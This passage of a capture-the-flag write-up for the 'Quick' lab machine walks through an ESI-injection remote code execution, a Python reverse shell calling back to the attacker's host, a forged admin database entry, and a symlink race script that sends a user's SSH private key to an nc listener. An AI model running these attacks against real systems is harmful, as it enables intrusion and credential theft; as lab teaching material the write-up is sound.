+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">"10.10.10.10"</span>,8585));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.186 - - [08/May/2020 16:20:10] <span class="string">"GET /rce.xsl HTTP/1.1"</span> 200 -</span><br><span class="line">10.10.10.186 - - [08/May/2020 16:20:11] <span class="string">"GET /dummy.xml HTTP/1.1"</span> 200 -</span><br><span class="line">10.10.10.186 - - [08/May/2020 16:20:11] <span class="string">"GET /hg8.py HTTP/1.1"</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<p>Let’s now do one last injection by replacing our payload to launch the reverse shell we just downloaded to the server:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"hg8"</span>&gt;</span>&lt;![CDATA[python /tmp/hg8.py]]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We open our <code>nc</code> listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>Create one last ticket with our new payload and we get an incoming connection:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.186:50914</span><br><span class="line">$ ls</span><br><span class="line">esigate-distribution-5.2</span><br><span class="line">nc</span><br><span class="line">user.txt</span><br><span class="line">$ cat user.txt</span><br><span class="line">cxxxxxxxxxxxxxxxxxxxx8</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Automating-ESI-injection-to-RCE"><a href="#Automating-ESI-injection-to-RCE" class="headerlink" title="Automating ESI injection to RCE"></a>Automating ESI injection to RCE</h3><p>Since I had a lot of issue to create ticket and inject payload (machine reset, caching system, etc…). I had to write the following script in order to ease the process:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">login = s.post(<span class="string">"http://quick.htb:9001/login.php"</span>,</span><br><span class="line">               data=&#123;<span class="string">'email'</span>: <span class="string">'elisa@wink.co.uk'</span>, <span class="string">'password'</span>: <span class="string">'Quick4cc3$$'</span>&#125;)</span><br><span class="line"></span><br><span class="line">cache_version = randrange(<span class="number">1000000000</span>)</span><br><span class="line"></span><br><span class="line">ticket_data = &#123;</span><br><span class="line">    <span class="string">'title'</span>: <span class="string">'hg8'</span>,</span><br><span class="line">    <span class="string">'msg'</span>: <span class="string">'hg8'</span>,</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'&lt;esi:include src="http://10.10.10.10:8000/dummy.xml?a=&#123;0&#125;" stylesheet="http://10.10.10.10:8000/rce.xsl?a=&#123;0&#125;"&gt;&lt;/esi:include&gt;'</span>.format(cache_version),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ticket = s.post(<span class="string">"http://quick.htb:9001/ticket.php"</span>, data=ticket_data, allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p><em>Note: Including the payload in the <code>id</code> field removed the need to load the ticket in order to have the payload to execute.</em></p>
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The first step to make a proper recon is to upgrade our shell to a fully interactive one. To do so I will add my SSH key to the <code>authorized_keys</code> of <code>sam</code> user:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"ssh-rsa AAxxx hg8@htb.htb"</span> &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb sam@quick.htb</span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Tue May  5 09:24:47 2020 from 10.10.14.5</span><br><span class="line">sam@quick:~$</span><br></pre></td></tr></table></figure>
+
+<p>With this proper shell we can start looking around. A common thing to check is the <code>/var/www/html</code> folder, maybe we can find the database access of the Quick web app and find other accounts credentials. Let’s take a look:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ cat /var/www/html/db.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$conn</span> = new mysqli(<span class="string">"localhost"</span>,<span class="string">"db_adm"</span>,<span class="string">"db_p4ss"</span>,<span class="string">"quick"</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Bingo, we got the database credentials. Let’s connect to see if we can find additional informations:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/var/www/html$ mysql -u db_adm -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| quick              |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; USE quick</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW TABLES;</span><br><span class="line">+-----------------+</span><br><span class="line">| Tables_in_quick |</span><br><span class="line">+-----------------+</span><br><span class="line">| <span class="built_in">jobs</span>            |</span><br><span class="line">| tickets         |</span><br><span class="line">| users           |</span><br><span class="line">+-----------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM users;</span><br><span class="line">+--------------+------------------+----------------------------------+</span><br><span class="line">| name         | email            | password                         |</span><br><span class="line">+--------------+------------------+----------------------------------+</span><br><span class="line">| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |</span><br><span class="line">| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |</span><br><span class="line">+--------------+------------------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>We got a new account <code>Server Admin</code> and its password which looks like a MD5.<br>But something is odd. We have <code>Elisa</code> password but its MD5 hash doesn’t correspond to the one in the database:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"Quick4cc3$$"</span> | md5sum</span><br><span class="line">81dfe07dcdcf072cf553e37497f188f5  -</span><br></pre></td></tr></table></figure>
+
+<p>Looking through the source code we got the confirmation that the password is hashed but not with a simple MD5:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ cat /var/www/html/login.php</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_POST</span>[<span class="string">"email"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</span><br><span class="line"><span class="variable">$password</span> = md5(crypt(<span class="variable">$password</span>,<span class="string">'fa'</span>));</span><br></pre></td></tr></table></figure>
+
+<p>In addition, while looking at the current app source code we notice two other folder <code>/var/www/</code> folder:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ ls -l /var/www/</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar 20 03:48 html</span><br><span class="line">drwxrwxrwx 2 root root 4096 Mar 21 03:11 <span class="built_in">jobs</span></span><br><span class="line">drwxr-xr-x 6 root root 4096 Mar 21 03:08 printer</span><br></pre></td></tr></table></figure>
+
+<p>While the <code>jobs</code> folder is empty, the <code>printer</code> function contains another web application:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ ls -l /var/www/printer/</span><br><span class="line">total 60</span><br><span class="line">-rw-r--r-- 1 root root 8709 Mar 19 05:04 add_printer.php</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar 18 13:34 css</span><br><span class="line">-rw-r--r-- 1 root root   69 Mar 18 13:22 db.php</span><br><span class="line">drwxr-xr-x 4 root root 4096 Mar 20 02:31 escpos-php</span><br><span class="line">-rw-r--r-- 1 root root 1150 Mar 18 13:34 favicon.ico</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar 18 13:34 fonts</span><br><span class="line">-rw-r--r-- 1 root root 2591 Mar 19 05:30 home.php</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar 19 05:30 images</span><br><span class="line">-rw-r--r-- 1 root root 3348 Mar 20 05:33 index.php</span><br><span class="line">-rw-r--r-- 1 root root 6392 Mar 21 03:08 job.php</span><br><span class="line">-rw-r--r-- 1 root root 5380 Mar 19 05:04 printers.php</span><br><span class="line">sam@quick:/$ cat /var/www/printer/db.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$conn</span> = new mysqli(<span class="string">"localhost"</span>,<span class="string">"db_adm"</span>,<span class="string">"db_p4ss"</span>,<span class="string">"quick"</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Since this <code>printer</code> app share the same database we can guess that the user <code>Server Admim</code> is used to connect to this app. Let’s know take a quick look at the Apache configuration file to see where the <code>printer</code> app is served.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ cat /etc/apache2/sites-enabled/000-default.conf</span><br><span class="line">[...]</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        AssignUserId srvadm srvadm</span><br><span class="line">        ServerName printerv2.quick.htb</span><br><span class="line">        DocumentRoot /var/www/printer</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We get two pieces of valuable information here:</p>
+<ol>
+<li>The app is accessible at <code>http://printerv2.quick.htb</code></li>
+<li>The Apache process for this app is running as <code>srvadm</code>.</li>
+</ol>
+<p>This <code>AssignUserId</code> is very interesting, because if we can find a remote code execution exploit in the <code>printer</code> app, we can obtain a shell as <code>srvadm</code>. Let’s add it to our host file and dig into this <code>printer</code> app to see if it’s possible.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.186 printerv2.quick.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Pivot-sam-gt-srvadm"><a href="#Pivot-sam-gt-srvadm" class="headerlink" title="Pivot sam -&gt; srvadm"></a>Pivot sam -&gt; srvadm</h3><p>Opening <code>http://printerv2.quick.htb:9001</code> display the following login page:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81424811-cf56ab00-9156-11ea-9f80-110af7481354.png" alt="quick printer login"></p>
+<p>We are stuck here, we don’t have the password for <code>srvadm@quick.htb</code>  and the credentials of <code>elisa@wink.co.uk</code> doesn’t seems to work. Maybe we could try to write a script to brute force the <code>srvadm@quick.htb</code> using the <code>fa</code> salt ?</p>
+<p> Well first let’s check this login page source code to see if we can find an hint before jumping to the brute force method.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"db.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"email"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"password"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        $email=$_POST[<span class="string">"email"</span>];</span><br><span class="line">        $password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">        $password = md5(crypt($password,<span class="string">'fa'</span>));</span><br><span class="line">        $stmt=$conn-&gt;prepare(<span class="string">"select email,password from users where email=? and password=?"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>,$email,$password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $result = $stmt-&gt;get_result();</span><br><span class="line">        $num_rows = $result-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span>($num_rows &gt; <span class="number">0</span> &amp;&amp; $email === <span class="string">"srvadm@quick.htb"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                session_start();</span><br><span class="line">                $_SESSION[<span class="string">"loggedin"</span>]=$email;</span><br><span class="line">                header(<span class="string">"location: home.php"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Invalid Credentials");window.location.href="/index.php";&lt;/script&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Few interesting informations to notice here, first:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($num_rows &gt; <span class="number">0</span> &amp;&amp; $email === <span class="string">"srvadm@quick.htb"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>This explains why we couldn’t login as <code>elisa@wink.co.uk</code>. But wait a second…. If <code>$num_rows &gt; 0</code> is the only check made to see if user credentials are correct we could perfectly use our MySQL access to create a second account with email <code>srvadm@quick.htb</code> and our own password right ? Let’s give it a try:</p>
+<p>First we generate our MD5 password using the <code>fa</code> salt:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; <span class="built_in">echo</span> md5(crypt(<span class="string">"hg8quickpassword"</span>,<span class="string">'fa'</span>));</span><br><span class="line">489000625cdbf4bcda48a8bf0381197a</span><br></pre></td></tr></table></figure>
+
+<p>Then add our new account using our MySQL access:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ mysql -u db_adm -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line"></span><br><span class="line">mysql&gt; USE quick</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO users VALUES (<span class="string">"hg8"</span>, <span class="string">"srvadm@quick.htb"</span>, <span class="string">"489000625cdbf4bcda48a8bf0381197a"</span>);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>We can now try to connect using our newly made credentials:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81425687-607a5180-9158-11ea-92d4-cf4faf6106ed.png" alt="quick printer login"></p>
+<p>Without surprise (given the name of the app) we arrive to a printer management interface. The homepage propose two options:</p>
+<ul>
+<li>Add printer</li>
+<li>List printers</li>
+</ul>
+<p>Since there is no printers available, let’s add our own one. I am going to open a <code>nc</code> listener to see if the app is sending request to the networked “printer” we are about to configure:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>Let’s put our listener IP and port on the <code>printer</code> config page:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81426297-48570200-9159-11ea-9bc9-7e977e20b31c.png" alt="quick printer add"></p>
+<p>Once the printer added, it gets listed in <code>/printers</code> page:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81426543-a257c780-9159-11ea-8a9a-379f338ed4c2.png" alt="quick list printers"></p>
+<p>From there we can launch a “Test print”. Let’s do that:</p>
+<blockquote>
+<p>Printer is up. Please add a <a href="http://printerv2.quick.htb:9001/job.php?title=hg8" target="_blank" rel="noopener">job</a></p>
+</blockquote>
+<p>Our <code>nc</code> listener got a connection and got closed:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.186:49180</span><br><span class="line">Total received bytes: 0</span><br><span class="line">Total sent bytes: 0</span><br></pre></td></tr></table></figure>
+
+<p>Let’s re-open it and head to <code>/job.php</code> to print a test page: </p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81426943-3b86de00-915a-11ea-9ec4-9953d2c9b50f.png" alt="quick printer test print"></p>
+<p>When clicking on “Print” our <code>nc</code> listener receive the content of “Bill Details”:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.186:49222</span><br><span class="line">This is a test.VA</span><br><span class="line">Total received bytes: 20</span><br><span class="line">Total sent bytes: 0</span><br></pre></td></tr></table></figure>
+
+<p>What exactly happened here? Luckily we have access to the code source of the app, so we can check how the <code>job.php</code> works and maybe a way to exploit it:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">[...]</span><br><span class="line">    $title=$_POST[<span class="string">"title"</span>];</span><br><span class="line">    $file = date(<span class="string">"Y-m-d_H:i:s"</span>);</span><br><span class="line">    file_put_contents(<span class="string">"/var/www/jobs/"</span>.$file,$_POST[<span class="string">"desc"</span>]);</span><br><span class="line">    chmod(<span class="string">"/var/www/printer/jobs/"</span>.$file,<span class="string">"0777"</span>);</span><br><span class="line">    $stmt=$conn-&gt;prepare(<span class="string">"select ip,port from jobs"</span>);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $result=$stmt-&gt;get_result();</span><br><span class="line">    <span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">[...]</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        $connector = <span class="keyword">new</span> NetworkPrintConnector($ip,$port);</span><br><span class="line">        sleep(<span class="number">0.5</span>); <span class="comment">//Buffer for socket check</span></span><br><span class="line">        $printer = <span class="keyword">new</span> Printer($connector);</span><br><span class="line">        $printer -&gt; text(file_get_contents(<span class="string">"/var/www/jobs/"</span>.$file));</span><br><span class="line">        $printer -&gt; cut();</span><br><span class="line">        $printer -&gt; close();</span><br><span class="line">        $message=<span class="string">"Job assigned"</span>;</span><br><span class="line">        unlink(<span class="string">"/var/www/jobs/"</span>.$file);</span><br><span class="line">      &#125;</span><br><span class="line">[..]</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Reading through the code we understand that our page test input gets written to file in the <code>/var/www/jobs/</code> folder. Then:</p>
+<ol>
+<li>The job get added to database, </li>
+<li>A network print connector is initialized,</li>
+<li>The file get read from <code>/var/www/jobs/</code></li>
+<li>The file content get send to the printer (our <code>nc</code> listener.)</li>
+</ol>
+<p>That’s a lot of steps between the moment the file is written to disk and the moment its read to be send to the printer. This sounds like a perfect scenario for a race condition. </p>
+<p>Knowing that the Apache process for the printer app is running as <code>srvadm</code> we could potentially exploit this race condition to read any files owned by <code>srvadm</code>. The first that comes to mind is <code>srvadm</code> SSH key.</p>
+<p>One way we could exploit the race condition to read <code>srvadm</code> SSH key is to replace the file to be printed by a symlink to <code>/home/srvadm/.ssh/id_rsa</code> just before it gets read and send to our <code>nc</code> listener.</p>
+<p>Let’s make a quick script to achieve this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/<span class="built_in">jobs</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> $(ls .);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        rm <span class="variable">$file</span>;</span><br><span class="line">        ln -s /home/srvadm/.ssh/id_rsa <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>The script monitor the <code>/var/www/jobs</code> directory and for each new file created, this one will be deleted and replaced by a symlink to <code>srvadm</code> SSH key. </p>
+<p>This way when the printer app arrive to this statement : <code>$printer -&gt; text(file_get_contents(&quot;/var/www/jobs/&quot;.$file));</code>, it will read the SSH key and send it to our listener.</p>
+<p>Let’s give it a try!</p>
+<p>First we open our <code>nc</code> listener (our fake printer):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>Then we launch our script on the box:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sam@quick:/$ bash /tmp/.hg8/race.sh</span><br></pre></td></tr></table></figure>
+
+<p>And finally we create a random new job on the printer app interface:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81426943-3b86de00-915a-11ea-9ec4-9953d2c9b50f.png" alt="quick printer test print"></p>
+<p>If everything goes fine our listener receive the SSH key:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.186:54026</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P</span><br><span class="line">[...]</span><br><span class="line">NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">VATotal received bytes: 1685</span><br><span class="line">Total sent bytes: 0</span><br></pre></td></tr></table></figure>
+
+<p>We can now use this key to connect to <code>srvadm</code> account:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_srvadm srvadm@quick.htb</span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Fri Mar 20 05:56:02 2020 from 172.16.118.129</span><br><span class="line">srvadm@quick:~$ ls</span><br><span class="line">srvadm@quick:~$</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cached-configuration"><a href="#Cached-configuration" class="headerlink" title="Cached configuration"></a>Cached configuration</h3><p>At first glance <code>srvadm</code> doesn’t hold any valuable informations nor tools. No SUID binary, no sudo entries, no misconfiguration… Then what ? </p>
+<p>Let’s manually review its home folder.</p>
